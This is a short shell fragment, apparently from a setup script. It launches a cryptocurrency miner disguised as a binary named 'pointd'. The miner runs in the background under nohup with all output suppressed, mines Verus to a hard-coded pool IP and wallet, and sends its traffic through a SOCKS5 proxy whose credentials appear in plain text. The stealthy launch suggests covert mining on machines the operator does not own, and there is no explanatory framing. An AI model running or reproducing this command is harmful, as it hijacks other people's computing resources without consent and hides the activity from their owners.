...
nohup ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8.ah -p x -t 2 -x socks5://Novax:chalHatt@129.158.58.77:1080 </dev/null >/dev/null 2>&1 &
echo "okesu"
